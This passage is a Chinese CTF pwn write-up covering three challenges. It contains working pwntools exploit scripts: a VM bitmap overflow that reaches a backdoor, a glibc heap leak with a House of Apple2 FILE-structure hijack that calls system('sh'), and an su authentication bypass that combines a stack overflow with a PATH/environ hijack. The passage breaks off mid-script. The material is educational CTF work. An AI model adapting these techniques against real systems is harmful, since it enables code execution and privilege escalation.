<p>恢复结构体为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((<span class="title">packed</span>)) __<span class="title">attribute__</span>((<span class="title">aligned</span>(1))) <span class="title">data</span> // <span class="title">sizeof</span>=</span><span class="number">0x37</span></span><br><span class="line"><span class="number">00000000</span> &#123;                                       <span class="comment">// XREF: .bss:data/r</span></span><br><span class="line"><span class="number">00000000</span>     <span class="type">int</span> len;                            <span class="comment">// XREF: main+A3/r main+D6/r ...</span></span><br><span class="line"><span class="number">00000004</span>     <span class="type">void</span> *buf;                          <span class="comment">// XREF: main+BB/w main+E6/r</span></span><br><span class="line"><span class="number">0000000</span>C     _BYTE bitmap[<span class="number">31</span>];</span><br><span class="line"><span class="number">0000002B</span>     __int8 *bitmapaddr;</span><br><span class="line"><span class="number">00000033</span>     <span class="type">int</span> pos;                            <span class="comment">// XREF: main:loc_1725/r</span></span><br><span class="line"><span class="number">00000037</span> &#125;;</span><br></pre></td></tr></table></figure>

<p>漏洞点</p>
<p>恢复结构体后发现bitmap少映射一个字节，进而导致溢出覆盖后面bitmap_addr</p>
<p>利用</p>
<p>迁移bitmap</p>
<p>程序给出了后门函数，但是需要qword_4097的值+0xdeadbeef等于&amp;qword_4097</p>
<p>​        而qword_4097本身不位于bitmap内，因此需要借助漏洞将bitmap迁移到特定地址，实现将&amp;qword_4097往后8字节均包含在bitmap内。</p>
<p>​        bitmap低位初始为0x6c（0110 1100），通过虚拟机提供的运算修把bitmap下图所示的三位修改，使得bitmap低位地址变为0x7f</p>
<p><img src="/1763435254333-4.png" alt="img"></p>
<p>此时的bitmap不仅包含了bitmap_addr的值,还覆盖了&amp;qword_4097~&amp;qword_4097+8的地址</p>
<p><img src="/1763435254333-5.png" alt="img"></p>
<p>拷贝bitmap_addr到qword_4097</p>
<p>因为qword_4097最终值为&amp;qword_4097-0xdeadbeef，所以我们需要先将与&amp;qword_4097有一定偏移的值复制过去，然后再修改为xxx97</p>
<p>加上0xdeadbeef的补码</p>
<p>程序只提供了与或非 和一个带进位的加，所以只能使用减去一个数等于加上一个数的补码来计算</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">count=<span class="number">0</span></span><br><span class="line">code=b<span class="string">&quot;&quot;</span></span><br><span class="line">def xor_a1_a2(a1,a2):</span><br><span class="line">    global count</span><br><span class="line">    global code</span><br><span class="line">    code+=b<span class="string">&quot;\x01&quot;</span>+bytes([a1])+b<span class="string">&quot;\x00&quot;</span>+bytes([a2])</span><br><span class="line">    count+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line">def xor_a1_i2(a1,i2):</span><br><span class="line">    global count </span><br><span class="line">    global code</span><br><span class="line">    code+=b<span class="string">&quot;\x01&quot;</span>+bytes([a1])+b<span class="string">&quot;\x01&quot;</span>+bytes([i2])</span><br><span class="line">    count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">def and_a1_a2(a1,a2):</span><br><span class="line">    global count </span><br><span class="line">    global code</span><br><span class="line">    code+=b<span class="string">&quot;\x02&quot;</span>+bytes([a1])+b<span class="string">&quot;\x00&quot;</span>+bytes([a2])</span><br><span class="line">    count+=<span class="number">1</span></span><br><span class="line">def and_a1_i2(a1,i2):</span><br><span class="line">    global count </span><br><span class="line">    global code</span><br><span class="line">    code+=b<span class="string">&quot;\x02&quot;</span>+bytes([a1])+b<span class="string">&quot;\x01&quot;</span>+bytes([i2])</span><br><span class="line">    count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">def or_a1_a2(a1,a2):</span><br><span class="line">    global count </span><br><span class="line">    global code</span><br><span class="line">    code+=b<span class="string">&quot;\x03&quot;</span>+bytes([a1])+b<span class="string">&quot;\x00&quot;</span>+bytes([a2])</span><br><span class="line">    count+=<span class="number">1</span></span><br><span class="line">def or_a1_i2(a1,i2):</span><br><span class="line">    global count </span><br><span class="line">    global code</span><br><span class="line">    code+=b<span class="string">&quot;\x03&quot;</span>+bytes([a1])+b<span class="string">&quot;\x01&quot;</span>+bytes([i2])</span><br><span class="line">    count+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">def addc_a1_a2(a1,a2):</span><br><span class="line">    global count </span><br><span class="line">    global code</span><br><span class="line">    code+=b<span class="string">&quot;\x04&quot;</span>+bytes([a1])+b<span class="string">&quot;\x00&quot;</span> +bytes([a2])</span><br><span class="line">    count+=<span class="number">1</span></span><br><span class="line">def addc_a1_i2(a1,a2):</span><br><span class="line">    global count </span><br><span class="line">    global code</span><br><span class="line">    code+=b<span class="string">&quot;\x04&quot;</span>+bytes([a1])+b<span class="string">&quot;\x01&quot;</span>+bytes([a2])</span><br><span class="line">    count+=<span class="number">1</span></span><br><span class="line"><span class="meta">#modify bitmap addr to 0x7f</span></span><br><span class="line">or_a1_i2(<span class="number">252</span>,<span class="number">1</span>)</span><br><span class="line">or_a1_i2(<span class="number">121</span>,<span class="number">1</span>)</span><br><span class="line">or_a1_i2(<span class="number">104</span>,<span class="number">1</span>)</span><br><span class="line"><span class="meta">#copy 96 -&gt;192</span></span><br><span class="line">start1=<span class="number">96</span></span><br><span class="line">start2=<span class="number">192</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">64</span>):</span><br><span class="line">    or_a1_a2(start2+i,start1+i)</span><br><span class="line">and_a1_i2(<span class="number">195</span>,<span class="number">0</span>)</span><br><span class="line">and_a1_i2(<span class="number">197</span>,<span class="number">0</span>)</span><br><span class="line">and_a1_i2(<span class="number">198</span>,<span class="number">0</span>)</span><br><span class="line">or_a1_i2(<span class="number">199</span>,<span class="number">1</span>)</span><br><span class="line">sub_deadbeef=((~<span class="number">0xdeadbeef</span> &amp; <span class="number">0xffffffffffffffff</span>)+<span class="number">1</span>) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">def get_i(n):</span><br><span class="line">    global sub_deadbeef</span><br><span class="line">    <span class="keyword">return</span> (sub_deadbeef&gt;&gt;n)&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">start3=<span class="number">192</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">64</span>):</span><br><span class="line">    addc_a1_i2(start3+i,get_i(i))</span><br><span class="line">sl(b<span class="string">&quot;Code Count: &quot;</span>,str(count).encode())</span><br><span class="line">sl(b<span class="string">&quot;Code: &quot;</span>,code)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Crew-manager"><a href="#Crew-manager" class="headerlink" title="Crew manager"></a>Crew manager</h3><p>漏洞点</p>
<p>在创建新的crew时，如果输入的backup_data超过了1280，那么程序会继续执行，并不会报错退出，而这样就导致crew结构体的backup_data指针区域会存放unsorted chunk的bk指针（指向top chunk），进而可以泄露地址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mchunkptr top;</span><br><span class="line"></span><br><span class="line">/* The remainder <span class="keyword">from</span> the most recent split of a small request */</span><br><span class="line">mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">/* Normal bins packed <span class="keyword">as</span> described above */</span><br><span class="line">mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br></pre></td></tr></table></figure>

<p>泄露出libc和heap（top chunk）后，通过改写top chunk的值使得下次的backupdata从fake top chunk获取，在fake top chunk的地方部署指定的libc地址，即可修改对应libc内容</p>
<p>由于是高版本的libc，只能使用hous of apple2利用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">manage_init</span>(<span class="params">index,name,department,back_size,back_data</span>):</span><br><span class="line">    c(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    sl(<span class="string">b&quot;[Manage] Enter index: &quot;</span>,index)</span><br><span class="line">    sl(<span class="string">b&quot;Name: &quot;</span>,name)</span><br><span class="line">    sl(<span class="string">b&quot;Department: &quot;</span>,department)</span><br><span class="line">    back_size=<span class="built_in">str</span>(back_size).encode()</span><br><span class="line">    sl(<span class="string">b&quot;default size 32: &quot;</span>,back_size)</span><br><span class="line">    sl(<span class="string">b&quot;Init backup data: &quot;</span>,back_data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manage_vuln</span>(<span class="params">index,name,department</span>):</span><br><span class="line">    c(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    sl(<span class="string">b&quot;[Manage] Enter index: &quot;</span>,index)</span><br><span class="line">    sl(<span class="string">b&quot;Name: &quot;</span>,name)</span><br><span class="line">    sl(<span class="string">b&quot;Department: &quot;</span>,department)</span><br><span class="line">    back_size=<span class="built_in">str</span>(<span class="number">1288</span>).encode()</span><br><span class="line">    sl(<span class="string">b&quot;default size 32: &quot;</span>,back_size)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manage_updata</span>(<span class="params">index,name,department</span>):</span><br><span class="line">    c(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    sl(<span class="string">b&quot;[Manage] Enter index: &quot;</span>,index)</span><br><span class="line">    sl(<span class="string">b&quot;1. Update Info\n2. Promote\n3. Demote\n4. Delete\n5. Random Event\n&gt; &quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    sl(<span class="string">b&quot;New name: &quot;</span>,name)</span><br><span class="line">    sl(<span class="string">b&quot;New department: &quot;</span>,department)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manage_del</span>(<span class="params">index</span>):</span><br><span class="line">    c(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    sl(<span class="string">b&quot;[Manage] Enter index: &quot;</span>,index)</span><br><span class="line">    sl(<span class="string">b&quot;1. Update Info\n2. Promote\n3. Demote\n4. Delete\n5. Random Event\n&gt; &quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">summary</span>():</span><br><span class="line">    c(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backup_view</span>(<span class="params">index</span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    c(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    sl(<span class="string">b&quot;Index: &quot;</span>,index)</span><br><span class="line">    sl(<span class="string">b&quot;Invert\n&gt; &quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backup_overwrite</span>(<span class="params">index,data</span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    c(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    sl(<span class="string">b&quot;Index: &quot;</span>,index)</span><br><span class="line">    sl(<span class="string">b&quot;Invert\n&gt; &quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    sl(<span class="string">b&quot;New backup content: &quot;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backup_invert</span>(<span class="params">index,data</span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    c(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    sl(<span class="string">b&quot;Index: &quot;</span>,index)</span><br><span class="line">    sl(<span class="string">b&quot;Invert\n&gt; &quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    sl(<span class="string">b&quot;New backup content: &quot;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">global_init</span>(<span class="params">data</span>):</span><br><span class="line">    c(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    sl(<span class="string">b&quot;Hash+Append\n&gt; &quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    sl(<span class="string">b&quot;Global data: &quot;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">global_view</span>():</span><br><span class="line">    c(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    sl(<span class="string">b&quot;Hash+Append\n&gt; &quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">global_free</span>(<span class="params">data</span>):</span><br><span class="line">    c(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    sl(<span class="string">b&quot;Hash+Append\n&gt; &quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">global_hash</span>():</span><br><span class="line">    c(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    sl(<span class="string">b&quot;Hash+Append\n&gt; &quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># global_init(b&quot;aaaaaa&quot;)</span></span><br><span class="line"><span class="comment"># manage_init(0,b&quot;aaaaaaaa&quot;,b&quot;aaaaaaaa&quot;,32,b&quot;aaaaaaaa&quot;)</span></span><br><span class="line"></span><br><span class="line">manage_init(<span class="number">0</span>,<span class="string">b&quot;deadbeef&quot;</span>,<span class="string">b&quot;deadbeef&quot;</span>,<span class="number">1280</span>,<span class="string">b&quot;deadbeef&quot;</span>)</span><br><span class="line"><span class="comment"># 防止与topchunk合并</span></span><br><span class="line">manage_init(<span class="number">1</span>,<span class="string">b&quot;deadbeef&quot;</span>,<span class="string">b&quot;deadbeef&quot;</span>,<span class="number">1280</span>,<span class="string">b&quot;deadbeef&quot;</span>)</span><br><span class="line"><span class="comment">#得到一个1296大小的unsorted chunk</span></span><br><span class="line">manage_del(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># 先把tcache bin 中0x60大小的chunk给去掉了</span></span><br><span class="line">manage_vuln(<span class="number">0</span>,<span class="string">b&quot;deadbeef&quot;</span>,<span class="string">b&quot;deadbeef&quot;</span>)</span><br><span class="line"><span class="comment"># 对unsorted bin下手，按照malloc逻辑，这样会先另unsorted bin chunk放进large bin 所以此时的backup data指针指向的是一个libc地址</span></span><br><span class="line">manage_vuln(<span class="number">2</span>,<span class="string">b&quot;deadbeef&quot;</span>,<span class="string">b&quot;deadbeef&quot;</span>)<span class="comment">#泄露libc</span></span><br><span class="line">backup_view(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Backup @ 2: &quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">libc.address=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x203f40</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="comment"># 此时unsorted bin中为上次分割后的，因此再次申请会触发small request的逻辑，直接从unsorted bin中分割,这样bk指向的就是topchunk</span></span><br><span class="line">manage_vuln(<span class="number">3</span>,<span class="string">b&quot;deadbeef&quot;</span>,<span class="string">b&quot;deadbeef&quot;</span>)</span><br><span class="line">backup_view(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Backup @ 3: &quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">top_chunk=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak top chunk is &quot;</span>+ <span class="built_in">hex</span>(top_chunk))</span><br><span class="line">manage_init(<span class="number">4</span>,<span class="string">b&quot;deadbeef&quot;</span>,<span class="string">b&quot;deadbeef&quot;</span>,<span class="number">944</span>,<span class="string">b&quot;deadbeef&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建假的topchunk在堆上，并把io_list_all写入，接着再次通过漏洞分配到back_up_ptr为io_list_all的crew</span></span><br><span class="line">io_list_all=libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]</span><br><span class="line">manage_init(<span class="number">5</span>,<span class="string">b&quot;deadbeef&quot;</span>,<span class="string">b&quot;deadbeef&quot;</span>,<span class="number">1280</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x20271</span>)+p64(io_list_all)+p64(io_list_all))</span><br><span class="line">backup_overwrite(<span class="number">3</span>,p64(top_chunk+<span class="number">0x80</span>))</span><br><span class="line">manage_vuln(<span class="number">6</span>,<span class="string">b&quot;deadbeef&quot;</span>,<span class="string">b&quot;deadbeef&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#将fake_io wide_vtable fake_wide_data 合三为一</span></span><br><span class="line">fake_io_addr=top_chunk-<span class="number">0x510</span>+<span class="number">0x10</span></span><br><span class="line">wide_vtable=libc</span><br><span class="line">fake_io=<span class="string">b&quot;  sh;&quot;</span>.ljust(<span class="number">0x28</span>,<span class="string">b&quot;\x00&quot;</span>)<span class="comment">#将flag部分写入sh</span></span><br><span class="line">fake_io+=p64(<span class="number">1</span>)<span class="comment"># 绕过 io_flush_allio_flush_all fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line">fake_io=fake_io.ljust(<span class="number">0x68</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">fake_io+=p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]) <span class="comment">#wide_vtable的doallocate 填充为system</span></span><br><span class="line">fake_io=fake_io.ljust(<span class="number">0x88</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">fake_io+=p64(libc.address+<span class="number">0x0000000002047A0</span>)<span class="comment"># 绕过 io_flush_all内部的_IO_flockfile (fp);</span></span><br><span class="line">fake_io=fake_io.ljust(<span class="number">0xa0</span>,<span class="string">b&quot;\x00&quot;</span>) <span class="comment"># 伪造io结构体的wide_data</span></span><br><span class="line">fake_io+=p64(fake_io_addr)</span><br><span class="line">fake_io=fake_io.ljust(<span class="number">0xd8</span>,<span class="string">b&quot;\x00&quot;</span>)<span class="comment"># 伪造io结构体的 vtable为io_wfile_jumps</span></span><br><span class="line">fake_io+=p64(libc.sym[<span class="string">&quot;_IO_wfile_jumps&quot;</span>])<span class="comment"># </span></span><br><span class="line">fake_io=fake_io.ljust(<span class="number">0xe0</span>,<span class="string">b&quot;\x00&quot;</span>)<span class="comment"># wide_data的wide vtable</span></span><br><span class="line">fake_io+=p64(fake_io_addr)</span><br><span class="line"></span><br><span class="line">backup_overwrite(<span class="number">6</span>,p64(fake_io_addr))</span><br><span class="line">backup_overwrite(<span class="number">1</span>,fake_io)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fake io addr : &quot;</span>+<span class="built_in">hex</span>(fake_io_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc : &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak top chunk is&quot;</span>+<span class="built_in">hex</span>(top_chunk))</span><br></pre></td></tr></table></figure>

<h3 id="YOLO"><a href="#YOLO" class="headerlink" title="YOLO"></a>YOLO</h3><p>看了队长给的wp</p>
<p><strong>漏洞点</strong></p>
<p><strong>su程序存在认证漏洞：</strong></p>
<p>​        通过再users map里取出输入用户名对应的user结构，但是c++map容器如果找不到对应的键，就会返回一个成员全为0的user结构（即pwd对应的hash为0,uid值也为0，这样就可以通过cat获取flag的值）</p>
<p>​        而在login程序中，如果传递密码为\x00,其hash值也为\x00。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v7 = (_QWORD *)<span class="built_in">std</span>::__detail::_Map_base&lt;<span class="built_in">std</span>::<span class="built_in">string</span>,<span class="built_in">std</span>::<span class="built_in">pair</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span> <span class="type">const</span>,user&gt;,<span class="built_in">std</span>::allocator&lt;<span class="built_in">std</span>::<span class="built_in">pair</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span> <span class="type">const</span>,user&gt;&gt;,<span class="built_in">std</span>::__detail::_Select1st,<span class="built_in">std</span>::equal_to&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;,<span class="built_in">std</span>::hash&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;,<span class="built_in">std</span>::__detail::_Mod_range_hashing,<span class="built_in">std</span>::__detail::_Default_ranged_hash,<span class="built_in">std</span>::__detail::_Prime_rehash_policy,<span class="built_in">std</span>::__detail::_Hashtable_traits&lt;<span class="literal">true</span>,<span class="literal">false</span>,<span class="literal">true</span>&gt;,<span class="literal">true</span>&gt;::operator[](</span><br><span class="line">                 &amp;users[abi:cxx11],</span><br><span class="line">                 v11);</span><br><span class="line">curr = (__int64)v7;</span><br><span class="line"><span class="keyword">if</span> ( v11[<span class="number">0</span>] != &amp;v11[<span class="number">2</span>] &amp;&amp; (operator delete(v11[<span class="number">0</span>], (<span class="type">unsigned</span> __int64)v11[<span class="number">2</span>] + <span class="number">1</span>), (v7 = (_QWORD *)curr) == <span class="number">0LL</span>)</span><br></pre></td></tr></table></figure>

<p>​        并且login的checkauth逻辑虽然会对每个字符判断是否为可打印字符，但是其for循环逻辑跳过了\x00</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = pwd[abi:cxx11] + <span class="number">1</span>; (_BYTE)v1; v1 = *(<span class="type">char</span> *)(i - <span class="number">1</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">isprint</span>((<span class="type">unsigned</span> <span class="type">int</span>)(<span class="type">char</span>)v1) )</span><br><span class="line">    panic(<span class="string">&quot;!isprint(ch)&quot;</span>);</span><br><span class="line">  ++i;</span><br><span class="line">  result = v1</span><br><span class="line">         + (((<span class="type">unsigned</span> __int64)pwd_hash &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * pwd_hash)) * (((<span class="type">unsigned</span> __int64)pwd_hash &gt;&gt; <span class="number">15</span> == <span class="number">0</span>) + <span class="number">1336LL</span>);</span><br><span class="line">  pwd_hash = result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        在su的init程序中可以恢复出user结构体,所以对于不存在users中的用户名，其pwd_hash、uid均为0，uid为0即root就可以读取flag，但是其cmd白名单为空。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">char</span> *pwd_hash;</span><br><span class="line"><span class="type">int</span> uid;</span><br><span class="line"><span class="type">char</span> pad[<span class="number">4</span>];</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; cmd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>su程序的getcmd存在栈溢出</strong></p>
<p>​        通过覆盖栈上的environ指针最后一个字节，传递用户名PATH&#x3D;&#x2F;work，使得environ指向的值从U&#x3D;PATH&#x3D;&#x2F;work变为PATH&#x3D;&#x2F;work ，从而使得系统在执行system(“id”)的时候，从&#x2F;work目录下执行用户自定义设置的脚本（命名为id），从而绕过cmd白名单</p>
<p><strong>exp</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import subprocess</span><br><span class="line">context.terminal = [<span class="string">&quot;gnome-terminal&quot;</span>, <span class="string">&quot;--&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>]  </span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">r = lambda x: p.recvuntil(x,drop=True)</span><br><span class="line">s = lambda x,y: p.sendafter(x,y)</span><br><span class="line">sl= lambda x,y: p.sendlineafter(x,y)</span><br><span class="line">file=<span class="string">&quot;./launch.sh&quot;</span></span><br><span class="line">p=remote(<span class="string">&quot;60.205.163.215&quot;</span>,<span class="number">28465</span>)</span><br><span class="line">p.recvuntil(b<span class="string">&quot;use `kctf-pow solve` to prove 